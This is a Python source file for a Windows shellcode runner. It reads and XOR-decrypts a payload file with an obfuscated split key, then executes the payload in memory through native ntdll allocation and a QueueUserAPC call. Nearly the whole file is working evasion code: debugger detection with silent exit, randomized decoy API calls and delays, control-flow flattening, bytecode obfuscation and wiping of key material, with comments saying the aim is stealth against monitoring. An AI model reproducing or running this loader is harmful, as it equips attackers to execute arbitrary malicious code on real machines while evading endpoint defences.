import ctypes
import time
import os
import random
import marshal
import types
import sys
from ctypes import wintypes

# String obfuscation for file path only
def decode_string(encoded, key=0x55):
    return bytes([b ^ key for b in encoded]).decode()

def encode_string(plaintext, key=0x55):
    return bytes([ord(c) ^ key for c in plaintext])

# Obfuscated file path only
OBF_FILE_PATH = encode_string("XOR_Hello_Message_ShellCode.bin")

# Key obfuscation - split into 8 chunks with different XOR keys
KEY_CHUNKS = [
    bytearray.fromhex("69ca7c37"),
    bytearray.fromhex("8a6048f3"),
    bytearray.fromhex("74fd609b"),
    bytearray.fromhex("874eb85e"),
    bytearray.fromhex("32ce923b"),
    bytearray.fromhex("bbbb3aaa"),
    bytearray.fromhex("56a98044"),
    bytearray.fromhex("ab727fb8")
]

XOR_KEYS = [0xAA, 0x55, 0xC3, 0x7F, 0x1E, 0x2D, 0x4B, 0x87]
KEY_LENGTH = 32

# Anti-debugging check
def anti_debug_check():
    kernel32 = ctypes.windll.kernel32
    return kernel32.IsDebuggerPresent()

# Simplified polymorphic code generator - removed for compatibility
def mutate_code():
    # Skip code mutation for Python 3.13 compatibility
    pass

# Control flow flattening
def flattened_control_flow(states):
    state = 0
    while state < len(states):
        if anti_debug_check():
            # Debugger detected, exit silently
            os._exit(0)
            
        # Execute the current state function
        states[state]()
            
        # Next state with some randomness
        state += random.randint(1, 2) if state % 3 == 0 else 1

# Bytecode obfuscation
def obfuscate_and_execute(func):
    # Get the function's code object
    code_obj = func.__code__
    
    # Marshal the code object to bytes
    marshaled = marshal.dumps(code_obj)
    
    # Simple XOR obfuscation of the bytecode
    key = random.randint(1, 255)
    obfuscated = bytes([b ^ key for b in marshaled])
    
    # Deobfuscate and execute
    deobfuscated = bytes([b ^ key for b in obfuscated])
    new_code = marshal.loads(deobfuscated)
    
    # Create a new function from the code object
    new_func = types.FunctionType(new_code, globals(), func.__name__)
    
    return new_func()

def get_key_byte(index):
    chunk_index = index // 4
    byte_index = index % 4
    encrypted_byte = KEY_CHUNKS[chunk_index][byte_index]
    xor_key = XOR_KEYS[chunk_index]
    return encrypted_byte ^ xor_key

def secure_zeroize(data):
    """Securely zeroize data by overwriting with random bytes before zeroing"""
    if isinstance(data, (bytearray, list)):
        # Overwrite with random data first
        for i in range(len(data)):
            data[i] = os.urandom(1)[0]
        # Then zero out
        for i in range(len(data)):
            data[i] = 0
    elif hasattr(data, '__len__'):
        # For other types that support length and indexing
        for i in range(len(data)):
            data[i] = os.urandom(1)[0]
        for i in range(len(data)):
            data[i] = 0

def zeroize_key_chunks():
    print("[+] Zeroizing key chunks in memory")
    for chunk in KEY_CHUNKS:
        secure_zeroize(chunk)
    # Also zeroize XOR_KEYS
    secure_zeroize(XOR_KEYS)

def xor_decrypt_stream(encrypted_data):
    print("[+] Decrypting shellcode with key streaming...")
    
    # Show key info
    print(f"[+] Using {len(KEY_CHUNKS)} key chunks with different XOR keys")
    print(f"[+] Key length: {KEY_LENGTH} bytes")
    
    # Reconstruct the full key for display
    full_key = bytearray()
    for i in range(KEY_LENGTH):
        full_key.append(get_key_byte(i))
    
    print(f"[+] Reconstructed key: {full_key.hex()}")
    print(f"[+] Encrypted data length: {len(encrypted_data)} bytes")
    
    decrypted_data = bytearray()
    
    for i in range(len(encrypted_data)):
        key_byte = get_key_byte(i % KEY_LENGTH)
        decrypted_byte = encrypted_data[i] ^ key_byte
        decrypted_data.append(decrypted_byte)
    
    # Show first 16 bytes of decrypted data
    first_16_bytes = bytes(decrypted_data[:16])
    print(f"[+] First 16 bytes of decrypted data: {first_16_bytes.hex()}")
    print("[+] Shellcode decrypted successfully")
    
    # Zeroize the key material after use
    zeroize_key_chunks()
    
    return bytes(decrypted_data)

# Enhanced decoy functions with variable buffer sizes and dummy computations
def decoy_get_system_time():
    # Dummy computation
    dummy = random.randint(1000, 9999)
    dummy = dummy * 3 + 7
    
    kernel32 = ctypes.windll.kernel32
    class SYSTEMTIME(ctypes.Structure):
        _fields_ = [
            ("wYear", wintypes.WORD),
            ("wMonth", wintypes.WORD),
            ("wDayOfWeek", wintypes.WORD),
            ("wDay", wintypes.WORD),
            ("wHour", wintypes.WORD),
            ("wMinute", wintypes.WORD),
            ("wSecond", wintypes.WORD),
            ("wMilliseconds", wintypes.WORD)
        ]
    system_time = SYSTEMTIME()
    kernel32.GetSystemTime(ctypes.byref(system_time))
    
    # More dummy computation
    dummy = (dummy ^ 0xFFFF) + system_time.wMilliseconds
    return True

def decoy_get_computer_name():
    # Variable buffer size
    buf_size = random.randint(16, 32)
    
    # Dummy computation
    dummy = buf_size * 7 - 3
    
    kernel32 = ctypes.windll.kernel32
    computer_name = ctypes.create_unicode_buffer(buf_size)
    size = wintypes.DWORD(buf_size)
    result = kernel32.GetComputerNameW(computer_name, ctypes.byref(size))
    
    # More dummy computation
    dummy = dummy ^ len(computer_name.value) if result else dummy
    return True

def decoy_get_user_name():
    # Variable buffer size
    buf_size = random.randint(200, 300)
    
    # Dummy computation
    dummy = buf_size // 2 + 5
    
    advapi32 = ctypes.windll.advapi32
    user_name = ctypes.create_unicode_buffer(buf_size)
    size = wintypes.DWORD(buf_size)
    result = advapi32.GetUserNameW(user_name, ctypes.byref(size))
    
    # More dummy computation
    dummy = (dummy + len(user_name.value)) % 256 if result else dummy
    return True

def decoy_get_current_directory():
    # Variable buffer size
    buf_size = random.randint(200, 300)
    
    # Dummy computation
    dummy = buf_size * 3 - 11
    
    kernel32 = ctypes.windll.kernel32
    current_dir = ctypes.create_unicode_buffer(buf_size)
    result = kernel32.GetCurrentDirectoryW(buf_size, current_dir)
    
    # More dummy computation
    dummy = dummy ^ result if result else dummy
    return True

def decoy_get_tick_count():
    # Dummy computation
    dummy = random.randint(1, 100)
    for i in range(dummy):
        dummy = (dummy * 3 + i) % 1000
    
    ctypes.windll.kernel32.GetTickCount()
    
    # More dummy computation
    dummy = dummy ^ 0x1234
    return True

def decoy_get_system_info():
    # Dummy computation
    dummy = random.randint(10, 50)
    dummy_list = [i * 2 for i in range(dummy)]
    
    kernel32 = ctypes.windll.kernel32
    class SYSTEM_INFO(ctypes.Structure):
        _fields_ = [
            ("dwOemId", wintypes.DWORD),
            ("dwPageSize", wintypes.DWORD),
            ("lpMinimumApplicationAddress", ctypes.c_void_p),
            ("lpMaximumApplicationAddress", ctypes.c_void_p),
            ("dwActiveProcessorMask", ctypes.c_void_p),
            ("dwNumberOfProcessors", wintypes.DWORD),
            ("dwProcessorType", wintypes.DWORD),
            ("dwAllocationGranularity", wintypes.DWORD),
            ("wProcessorLevel", wintypes.WORD),
            ("wProcessorRevision", wintypes.WORD)
        ]
    system_info = SYSTEM_INFO()
    kernel32.GetSystemInfo(ctypes.byref(system_info))
    
    # More dummy computation
    dummy = sum(dummy_list) % system_info.dwNumberOfProcessors
    return True

def decoy_get_volume_info():
    # Variable buffer sizes
    buf_size = random.randint(200, 300)
    
    # Dummy computation
    dummy = buf_size + random.randint(1, 100)
    
    kernel32 = ctypes.windll.kernel32
    volume_name = ctypes.create_unicode_buffer(buf_size)
    serial_number = wintypes.DWORD()
    max_component_len = wintypes.DWORD()
    file_system_flags = wintypes.DWORD()
    file_system_name = ctypes.create_unicode_buffer(buf_size)
    
    result = kernel32.GetVolumeInformationW(
        ctypes.c_wchar_p("C:\\"),
        volume_name,
        buf_size,
        ctypes.byref(serial_number),
        ctypes.byref(max_component_len),
        ctypes.byref(file_system_flags),
        file_system_name,
        buf_size
    )
    
    # More dummy computation
    dummy = (dummy * serial_number.value) % 1000 if result else dummy
    return True

def decoy_get_tick_count64():
    # Dummy computation
    dummy = random.randint(100, 1000)
    dummy_str = str(dummy)
    dummy = sum(ord(c) for c in dummy_str)
    
    ctypes.windll.kernel32.GetTickCount64()
    
    # More dummy computation
    dummy = dummy ^ 0xABCD
    return True

def decoy_get_process_id():
    # Dummy computation
    dummy = os.urandom(4)
    dummy_int = int.from_bytes(dummy, 'little') % 10000
    
    ctypes.windll.kernel32.GetCurrentProcessId()
    
    # More dummy computation
    dummy_int = (dummy_int * 7 + 3) % 65536
    return True

def decoy_get_thread_id():
    # Dummy computation
    dummy = time.time() % 1000
    dummy = int(dummy * 100)
    
    ctypes.windll.kernel32.GetCurrentThreadId()
    
    # More dummy computation
    dummy = (dummy >> 4) & 0xFF
    return True

# Additional decoy functions for more variety
def decoy_sleep_random():
    sleep_time = random.uniform(0.01, 0.1)
    time.sleep(sleep_time)
    return True

def decoy_dummy_computation():
    # Complex dummy computation
    result = 0
    for i in range(random.randint(50, 200)):
        result = (result * 3 + i) % 1000
    return True

def decoy_get_disk_space():
    kernel32 = ctypes.windll.kernel32
    free_bytes = ctypes.c_ulonglong(0)
    total_bytes = ctypes.c_ulonglong(0)
    free_bytes_ptr = ctypes.c_ulonglong(0)
    
    kernel32.GetDiskFreeSpaceExW(
        ctypes.c_wchar_p("C:\\"),
        ctypes.byref(free_bytes),
        ctypes.byref(total_bytes),
        ctypes.byref(free_bytes_ptr)
    )
    return True

def decoy_get_system_metrics():
    user32 = ctypes.windll.user32
    n_index = random.randint(0, 100)
    user32.GetSystemMetrics(n_index)
    return True

# List of all decoy functions
DECOY_FUNCTIONS = [
    decoy_get_system_time,
    decoy_get_computer_name,
    decoy_get_user_name,
    decoy_get_current_directory,
    decoy_get_tick_count,
    decoy_get_system_info,
    decoy_get_volume_info,
    decoy_get_tick_count64,
    decoy_get_process_id,
    decoy_get_thread_id,
    decoy_sleep_random,
    decoy_dummy_computation,
    decoy_get_disk_space,
    decoy_get_system_metrics
]

def run_random_decoys(num_decoys=None, min_delay=0.01, max_delay=0.2):
    """Execute a random selection of decoys in random order with random delays"""
    if num_decoys is None:
        num_decoys = random.randint(3, len(DECOY_FUNCTIONS))
    
    # Select random decoys
    selected_decoys = random.sample(DECOY_FUNCTIONS, num_decoys)
    
    # Randomize execution order
    random.shuffle(selected_decoys)
    
    # Execute each decoy with a random delay and occasional skipping
    for decoy in selected_decoys:
        # 15% chance to skip a decoy entirely
        if random.random() < 0.15:
            continue
            
        try:
            decoy()
            # Add a random delay
            time.sleep(random.uniform(min_delay, max_delay))
            
            # 10% chance to add an extra delay
            if random.random() < 0.1:
                extra_delay = random.uniform(0.05, 0.15)
                time.sleep(extra_delay)
                
        except:
            # Silently continue if a decoy fails
            pass

def execute_shellcode(shellcode):
    print("[+] Setting up execution environment with indirect syscalls")
    
    # Make random decoy API calls
    print("[+] Making random decoy API calls")
    run_random_decoys(random.randint(4, 10))  # Increased max number
    
    # Load ntdll directly
    ntdll = ctypes.WinDLL('ntdll.dll')
    
    # Define NT function prototypes
    ntdll.NtAllocateVirtualMemory.argtypes = [
        ctypes.c_void_p,  # ProcessHandle
        ctypes.POINTER(ctypes.c_void_p),  # BaseAddress
        ctypes.c_ulong,  # ZeroBits
        ctypes.POINTER(ctypes.c_size_t),  # RegionSize
        ctypes.c_ulong,  # AllocationType
        ctypes.c_ulong   # Protect
    ]
    ntdll.NtAllocateVirtualMemory.restype = ctypes.c_long
    
    ntdll.NtProtectVirtualMemory.argtypes = [
        ctypes.c_void_p,  # ProcessHandle
        ctypes.POINTER(ctypes.c_void_p),  # BaseAddress
        ctypes.POINTER(ctypes.c_size_t),  # RegionSize
        ctypes.c_ulong,  # NewProtect
        ctypes.POINTER(ctypes.c_ulong)   # OldProtect
    ]
    ntdll.NtProtectVirtualMemory.restype = ctypes.c_long
    
    ntdll.RtlCopyMemory.argtypes = [
        ctypes.c_void_p,  # Destination
        ctypes.c_void_p,  # Source
        ctypes.c_size_t   # Length
    ]
    ntdll.RtlCopyMemory.restype = None
    
    ntdll.NtFreeVirtualMemory.argtypes = [
        ctypes.c_void_p,  # ProcessHandle
        ctypes.POINTER(ctypes.c_void_p),  # BaseAddress
        ctypes.POINTER(ctypes.c_size_t),  # RegionSize
        ctypes.c_ulong   # FreeType
    ]
    ntdll.NtFreeVirtualMemory.restype = ctypes.c_long
    
    # Still use kernel32 for APC functions as they're less monitored
    kernel32 = ctypes.windll.kernel32
    
    # Set up function prototypes for kernel32 functions
    kernel32.QueueUserAPC.argtypes = [ctypes.c_void_p, wintypes.HANDLE, ctypes.c_void_p]
    kernel32.QueueUserAPC.restype = wintypes.BOOL
    
    kernel32.GetCurrentThread.argtypes = []
    kernel32.GetCurrentThread.restype = wintypes.HANDLE
    
    kernel32.SleepEx.argtypes = [wintypes.DWORD, wintypes.BOOL]
    kernel32.SleepEx.restype = wintypes.DWORD
    
    kernel32.GetLastError.argtypes = []
    kernel32.GetLastError.restype = ctypes.c_uint32

    # Make more decoy calls before memory operations
    print("[+] Making additional decoy API calls")
    run_random_decoys(random.randint(2, 6))  # Increased max number

    # Allocate memory using NT function
    print("[+] Allocating memory with NtAllocateVirtualMemory")
    base_address = ctypes.c_void_p(0)
    region_size = ctypes.c_size_t(len(shellcode))
    process_handle = ctypes.c_void_p(-1)  # Current process
    
    status = ntdll.NtAllocateVirtualMemory(
        process_handle,
        ctypes.byref(base_address),
        0,
        ctypes.byref(region_size),
        0x3000,  # MEM_COMMIT | MEM_RESERVE
        0x04     # PAGE_READWRITE
    )
    
    if status != 0:  # NTSTATUS success is 0
        raise Exception(f"NtAllocateVirtualMemory failed: 0x{status:08X}")
    
    ptr = base_address.value
    print(f"[+] Memory allocated at: {hex(ptr)}")
    print(f"[+] Shellcode length: {len(shellcode)} bytes")
    
    # Copy shellcode using RtlCopyMemory
    print("[+] Copying shellcode to memory using RtlCopyMemory")
    shellcode_buffer = ctypes.create_string_buffer(shellcode)
    ntdll.RtlCopyMemory(ptr, shellcode_buffer, len(shellcode))
    
    # Wipe the shellcode buffer from our process memory
    print("[+] Wiping shellcode buffer from process memory")
    secure_zeroize(shellcode_buffer)
    
    # Make decoy calls between memory operations
    run_random_decoys(random.randint(1, 4))  # Increased max number
    
    # Change memory protection using NT function
    print("[+] Changing memory protection with NtProtectVirtualMemory")
    old_protect = ctypes.c_ulong(0)
    status = ntdll.NtProtectVirtualMemory(
        process_handle,
        ctypes.byref(base_address),
        ctypes.byref(region_size),
        0x20,  # PAGE_EXECUTE_READ
        ctypes.byref(old_protect)
    )
    
    if status != 0:  # NTSTATUS success is 0
        raise Exception(f"NtProtectVirtualMemory failed: 0x{status:08X}")
    
    # Use QueueUserAPC for stealthier execution
    print("[+] Using QueueUserAPC for stealthy execution")
    hThread = kernel32.GetCurrentThread()
    
    if not kernel32.QueueUserAPC(ptr, hThread, 0):
        error_code = kernel32.GetLastError()
        raise Exception(f"QueueUserAPC failed: {error_code}")
    
    print("[+] APC queued successfully, entering alertable wait state")
    
    # Make decoy calls before sleep
    run_random_decoys(random.randint(1, 3))
    
    kernel32.SleepEx(0, 1)  # Enter alertable wait state to execute APC
    
    print("[+] Execution completed")
    
    # Free the memory after execution
    print("[+] Freeing allocated memory")
    free_region_size = ctypes.c_size_t(0)
    status = ntdll.NtFreeVirtualMemory(
        process_handle,
        ctypes.byref(base_address),
        ctypes.byref(free_region_size),
        0x8000  # MEM_RELEASE
    )
    
    if status != 0:
        print(f"[-] Warning: NtFreeVirtualMemory failed: 0x{status:08X}")
    else:
        print("[+] Memory successfully freed")
    
    # Final decoy calls
    run_random_decoys(random.randint(2, 5))  # Increased max number

# Encrypted main function that will be decrypted at runtime
def encrypted_main():
    try:
        print("[+] Starting shellcode runner")
        
        # Make initial decoy calls
        run_random_decoys(random.randint(5, 10))  # Increased max number
        
        # Decode file path
        file_path = decode_string(OBF_FILE_PATH)
        print(f"[+] Reading from: {file_path}")
        
        # Read the encrypted shellcode
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()
        
        print(f"[+] Read {len(encrypted_data)} bytes of encrypted data")
        print(f"[+] First 16 bytes of encrypted data: {encrypted_data[:16].hex()}")
        
        # Make decoy calls before decryption
        run_random_decoys(random.randint(2, 5))
        
        # Decrypt the shellcode
        shellcode = xor_decrypt_stream(encrypted_data)
        
        # Add a small delay with decoy calls during wait
        print("[+] Adding small delay with decoy API activity")
        start_time = time.time()
        while time.time() - start_time < 1:
            run_random_decoys(random.randint(1, 3), 0.05, 0.15)  # Increased max number
            time.sleep(0.1)
        
        # Execute the shellcode
        execute_shellcode(shellcode)
        
        print("[+] Process completed successfully")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

# Control flow states for flattening
def state_init():
    print("[+] Initializing...")
    run_random_decoys(2)

def state_read_file():
    print("[+] Reading file...")
    # This would contain the file reading logic

def state_decrypt():
    print("[+] Decrypting...")
    # This would contain the decryption logic

def state_execute():
    print("[+] Executing...")
    # This would contain the execution logic

def state_cleanup():
    print("[+] Cleaning up...")
    # This would contain cleanup logic

# Main execution with control flow flattening
if __name__ == "__main__":
    # Check for debugger
    if anti_debug_check():
        print("Debugger detected - exiting")
        os._exit(1)
    
    # Execute with flattened control flow
    states = [state_init, state_read_file, state_decrypt, state_execute, state_cleanup]
    
    # Simplified flattened control flow
    state = 0
    while state < len(states):
        if anti_debug_check():
            # Debugger detected, exit silently
            os._exit(0)
            
        # Execute the current state function
        states[state]()
        
        # Next state with some randomness
        state += random.randint(1, 2) if state % 3 == 0 else 1
    
    # Execute the main function with bytecode obfuscation
    obfuscate_and_execute(encrypted_main)